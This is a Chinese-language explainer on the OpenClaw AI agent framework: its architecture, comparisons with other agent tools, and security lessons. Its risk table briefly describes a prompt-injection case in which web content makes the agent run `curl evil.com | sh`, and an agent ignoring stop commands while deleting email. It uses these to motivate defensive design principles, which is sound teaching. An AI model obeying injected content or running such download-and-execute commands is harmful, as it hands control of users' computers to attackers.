# OpenClaw

> OpenClaw 是一个开源 AI Agent 框架，让 LLM 能直接操作你的电脑——执行命令、读写文件、操控软件。  
> 它的 Logo 是一只红色龙虾，中文圈常叫它"龙虾"。2025 年底问世后，以史上最快速度冲到 GitHub 28 万+ 星标。

## 一、先说结论

OpenClaw 的本质用一句话概括：

```text
OpenClaw = 给 LLM 配了一个"操作系统级的外骨骼"，
           让它不只停留在聊天窗口里，而是能直接动手操作电脑。
```

关键不是它用了什么新模型，而是它做了一件之前没人认真做的事：

```text
把"让 AI 控制电脑"这件事，从一个 demo 做成了一个可用的开源产品。
```

你可以把它理解为：**一个运行在你本地的、开源的、能操控电脑的 AI Agent**。

## 二、为什么需要理解它

### 它引爆了什么

OpenClaw 能在几个月内成为 GitHub 史上星标最高的开源项目，不是因为它技术最先进，而是因为它让普通人**第一次真切感受到"AI 能替我干活"是什么体验**。

之前：
```text
"AI Agent 能自动完成任务" —— 你只在论文和 demo 视频里见过
```

之后：
```text
你在自己电脑上装一个开源工具，AI 就能帮你排日程、整理文件、写代码、发消息
```

这种冲击力和当年 ChatGPT 第一次让普通人体验大模型是同一级别的。

### 它为什么在工程圈重要

| 维度 | 意义 |
|---|---|
| **Agent 工程化** | 证明了 Agent 不只是研究概念，可以做成实际产品 |
| **生态模式** | 5700+ 社区技能模块、50+ 消息平台集成，展示了"Agent 插件市场"的可行性 |
| **安全警示** | 1.5 万台设备公网暴露、prompt injection 致数据泄露，是最真实的 AI 安全教材 |
| **本地优先** | 支持本地部署模型，不是只能调云 API，对隐私敏感场景意义重大 |
| **中国市场** | 腾讯、字节、阿里、小米、华为全部跟进，是最快被产业化的开源 AI 项目 |

### 如果不理解它，容易产生的误解

- ❌ "就是个聊天机器人加了点工具" —— 不是。它的核心是**系统级权限**：Shell、文件系统、进程管理。
- ❌ "只有极客才玩得转" —— 一开始是，但桌面客户端 ClawX、云端平台 Prismer 都在降低门槛。
- ❌ "跟我的前端工作没关系" —— 有关系。它预示着下一波应用形态：AI 不再需要你打开网页或 App，直接替你完成任务。

## 三、举一个直观例子

### 场景：让 OpenClaw 帮你整理一周的会议纪要

假设你每天在各种地方开会——微信、飞书、邮件、Slack——会后笔记散落各处。你跟 OpenClaw 说：

```text
"帮我把这周所有会议的纪要整理成一个汇总文档，
按日期排序，标注每位参会人的待办事项，存到 ~/Documents/本周会议汇总.md"
```

**普通 LLM 的做法：**

```text
你：帮我整理会议纪要
LLM：好的，请把你所有的会议纪要粘贴给我。
你：（手动翻微信群 → 翻飞书 → 翻邮件 → 复制粘贴 → 发给 LLM）
LLM：（生成汇总）
你：（手动创建文件 → 粘贴 → 保存）
```

你仍然是"人肉胶水"。

**OpenClaw 的做法：**

```text
你：帮我整理这周所有会议的纪要...

OpenClaw 内部执行：
1. 思考：需要读取微信、飞书、邮件的聊天记录
2. 调用 WeChat MCP → 搜索本周群聊中的会议消息
3. 调用 Feishu MCP → 获取飞书会议纪要和待办
4. 调用 Gmail MCP → 搜索本周带"会议"标签的邮件
5. 汇总所有信息 → 提取参会人、待办事项
6. 按日期排序 → 生成 Markdown
7. 调用 FileSystem Tool → 写入 ~/Documents/本周会议汇总.md
8. 回复："已完成！汇总文档在 ~/Documents/本周会议汇总.md，共涉及 12 场会议，18 项待办。"
```

整个过程你只发了一句话，剩下的都是 Agent 自己完成。

### 用前端开发类比

```text
OpenClaw 之于操作系统，
就像 Puppeteer 之于浏览器。

Puppeteer 让你用代码操控 Chrome（点击、填表、截图），
OpenClaw 让 LLM 用自然语言操控整个电脑（开应用、写文件、发消息）。

区别在于：
Puppeteer 是你写脚本控制浏览器；
OpenClaw 是 LLM 替你写脚本、替你执行。
```

## 四、本质是什么

### 核心架构

OpenClaw 采用三层引擎设计：

```text
┌─────────────────────────────────────────┐
│           模型推理引擎                    │
│  支持本地部署（量化压缩 7B → 3GB）       │
│  也支持接入云端模型（GPT / Claude 等）   │
│  负责：理解用户意图、规划任务步骤        │
└──────────────────┬──────────────────────┘
                   ▼
┌─────────────────────────────────────────┐
│           任务调度中心                    │
│  有限状态机管理任务生命周期              │
│  负责：拆解复杂任务、编排执行顺序        │
│  跟踪进度、处理异常和重试               │
└──────────────────┬──────────────────────┘
                   ▼
┌─────────────────────────────────────────┐
│           设备控制接口                    │
│  标准化的系统调用封装                    │
│  负责：执行 Shell 命令、读写文件         │
│  操控软件、发送消息                     │
└─────────────────────────────────────────┘
```

### Agent 操作系统的四层模型

社区研究者把 OpenClaw 的架构抽象为四层：

| 层 | 作用 | 对应你熟悉的概念 |
|---|---|---|
| **智能体内核** | 任务理解、规划、执行循环 | 操作系统的 Kernel |
| **技能模块** | 可插拔的功能单元（5700+） | npm 包 / VS Code 插件 |
| **模型上下文协议** | 标准化模型与工具的通信 | HTTP 协议 / RESTful 规范 |
| **分层记忆** | 短期（当前任务）、长期（用户偏好） | Session Storage + 数据库 |

### 和之前学过的概念串联

```text
OpenClaw 是一个具体的 Agent 实现：

Agent = LLM + 目标 + 工具 + 记忆 + 执行循环    ← 概念层
          ↓
OpenClaw = 本地模型 + 用户指令 + 技能模块 + 分层记忆 + 任务调度  ← 工程层
              ↑                    ↑
          MCP 在这里             Tool 在这里
          （标准化通信）          （具体执行）
```

你之前学的 Agent 是"概念"，Tool 是"零件"，MCP 是"接口标准"——OpenClaw 是把这三样东西组合成**一个能用的产品**。

## 五、和相近概念的区别

### OpenClaw vs Claude Code / GitHub Copilot

| 维度 | OpenClaw | Claude Code / Copilot |
|---|---|---|
| 权限范围 | 操作系统级（任何事都能做） | 受限（代码仓库内 + 有限的系统调用） |
| 交互方式 | 聊天式自然语言 | 终端 / IDE 内 |
| 任务类型 | 通用（排日程、发消息、写代码、理文件） | 专注编程 |
| 安全边界 | 几乎没有默认边界（危险） | 有明确的权限和确认机制 |
| 开源 | 是 | 否 |

Claude Code 和 Copilot 是"专精编程的受控 Agent"，OpenClaw 是"无所不能的开源 Agent"。各有适用场景。

### OpenClaw vs LangChain / CrewAI 等 Agent 框架

| 维度 | OpenClaw | LangChain / CrewAI |
|---|---|---|
| 定位 | 面向最终用户的产品 | 面向开发者的框架 |
| 使用方式 | 聊天即可，不需写代码 | 需要写 Python/TS 编排逻辑 |
| 本地权限 | 直接操作系统 | 通常只操作你代码里定义的工具 |
| 生态 | 技能市场（用户贡献） | 工具集成（开发者贡献） |
| 适合谁 | 普通用户 + 开发者 | 主要是 AI 应用开发者 |

LangChain 是你用来**搭建** Agent 系统的框架，OpenClaw 本身**就是一个**做好的 Agent 系统。

### OpenClaw vs MCP

```text
MCP 是"协议标准"：定义了 Tool 怎么接入、怎么通信
OpenClaw 是"产品实现"：大量使用了 MCP 来接入各种工具和平台

关系：OpenClaw 内置了 MCP Client，一个 OpenClaw 实例
      可以同时连接多个 MCP Server（微信、飞书、GitHub...）
```

可以理解为：OpenClaw 是 MCP 生态里目前最成功的**消费者**——它证明了 MCP 那种"一次写 Server、到处复用"的愿景是可行的。

### OpenClaw vs ChatGPT 插件

| 维度 | OpenClaw | ChatGPT 插件 |
|---|---|---|
| 开放度 | 完全开源，任何人都能写技能模块 | 平台封闭，需要审核上架 |
| 部署位置 | 你的电脑上 | OpenAI 的服务器上 |
| 权限边界 | 你的电脑能做什么它就能做什么 | 严格受限 |
| 数据隐私 | 数据不离开你的机器（本地模型时） | 数据经过 OpenAI 服务器 |

## 六、对工程实践的影响

### 最重要的教训：安全

OpenClaw 暴露的安全问题，是每一个做 AI 应用的人都要认真对待的：

| 风险类型 | 具体案例 | 教训 |
|---|---|---|
| **公网暴露** | 1.5 万台设备公网可访问，中国占 3000 台 | 本地 Agent 服务绝不能直接暴露到公网 |
| **Prompt Injection** | 恶意网页内容让 AI 执行 `curl evil.com | sh` | 模型看到的所有外部内容都可能是攻击向量 |
| **供应链攻击** | 26% 社区技能有漏洞，1200+ 恶意技能被注入市场 | 第三方 Tool/Plugin 必须沙箱隔离 |
| **指令执行偏离** | AI 无视"停止"指令持续删除邮件 | 高风险操作需要硬编码中断机制，不能仅靠 Prompt 约束 |

这些不是 OpenClaw 特有的问题，而是**所有 Agent 系统的通用问题**。只是 OpenClaw 因为规模够大，把所有坑都暴露出来了。

### Agent 安全设计原则

从 OpenClaw 的教训中可以总结几条工程原则：

```text
1. 最小权限原则：
   不要让 Agent 拥有超过任务需要的权限。
   "能读文件"和"能删文件"是两种完全不同的权限级别。

2. 操作分级：
   Level 1（自动）：读文件、查信息
   Level 2（确认）：修改文件、发消息
   Level 3（禁止或人工批准）：删文件、转账、执行任意 Shell

3. 沙箱隔离：
   第三方技能/插件必须跑在受限环境里（Docker / VM），
   不能直接访问宿主机。

4. 日志完整：
   每一步操作都要记录：谁、什么时间、执行了什么命令、结果如何。
   出了事能回溯。

5. 硬中断机制：
   不能只靠 Prompt 里的"不要做 X"。
   关键操作要在执行层有拦截和确认，Prompt 只是第一层防线。
```

### 对 Prompt 工程的影响

OpenClaw 的实践表明：当 Agent 有系统级权限时，Prompt 的写法发生根本变化：

```text
传统 Prompt 侧重：怎么回答得更好
Agent Prompt 侧重：怎么安全地行动

新增的 Prompt 维度：
- 权限宣言：什么能做、什么不能做
- 确认规则：什么情况下必须问用户
- 降级策略：工具不可用时怎么办
- 中止条件：什么情况必须停下来
```

### 对 RagFlow 项目的启发

OpenClaw 的模块化设计对 RagFlow 有参考价值：

| OpenClaw 模块 | RagFlow 可借鉴的思路 |
|---|---|
| 技能市场（5700+ 技能） | 检索策略、Prompt 模板是否可以做成"可插拔模块"？ |
| 分层记忆 | 用户偏好、历史查询是否应该分层存储（短期/长期）？ |
| 多平台接入（50+ 平台） | RagFlow 是否需要支持多消息渠道（企业微信/Slack/API）？ |
| 安全分级 | 检索操作（读）vs 写操作，是否需要不同的权限控制？ |

## 七、常见误区

### 误区一：OpenClaw 是一个新的大模型

**错误理解：**
OpenClaw 和 GPT、Claude 一样，是一个大语言模型。

**正确理解：**
OpenClaw 不训练模型，它是一套**让现有模型获得操作系统权限的 Agent 框架**。你可以把 GPT、Claude 或本地开源模型接进去当"大脑"，OpenClaw 提供"手脚"和"执行逻辑"。

---

### 误区二：装上就能用，什么都不用管

**错误理解：**
下载 OpenClaw → 启动 → AI 自动帮我干活，全程不用操心。

**正确理解：**
OpenClaw 需要配置模型、安装技能模块、设置权限边界。如果不做安全配置就暴露到公网，你的电脑可能几分钟内被攻击者控制。它更接近"给一把真枪装了 AI 瞄准镜"——强大但危险，需要认真对待安全。

---

### 误区三：OpenClaw 只适合程序员

**错误理解：**
它是命令行工具，普通人用不了。

**正确理解：**
最初的版本确实偏极客，但后来有了桌面客户端 ClawX、Web 界面、云端平台 Prismer 等，交互方式越来越像聊天 App。就像 Linux 早期也是命令行为主，后来有了 Ubuntu 桌面——OpenClaw 正在走同样的路。

---

### 误区四：它代表着 AI Agent 的最终形态

**错误理解：**
OpenClaw 就是 Agent 的未来，以后所有 Agent 都长这样。

**正确理解：**
OpenClaw 证明了"AI 操控电脑"的可行性，但它在安全性、可靠性、权限管理上还很粗糙。它更像 Agent 时代的"福特 T 型车"——证明了方向是对的，但更成熟的产品（像今天的特斯拉）还在路上。真正的"Agent 最终形态"大概率不是你手动装在本地的开源项目，而是操作系统层面内置的能力。

```text
让普通人第一次在自己的电脑上，
用自然语言指挥 AI 完成真实任务。
```

它和 ChatGPT 的关系有点像：

```text
ChatGPT（2022）：让普通人体验"AI 能对话"
OpenClaw（2025）：让普通人体验"AI 能干活"
```

核心记忆句：

```text
OpenClaw = 一个开源的、能操控电脑的 AI Agent。
它证明了 Agent 时代的可行性，也暴露了 Agent 时代的安全危机。
```

和你学过的概念串联：


理解了这一串递进关系，你对"AI 应用开发"的认知框架就完整了：从怎么写一句话让模型听懂，到怎么让模型自主完成一个需要操作电脑的真实任务。
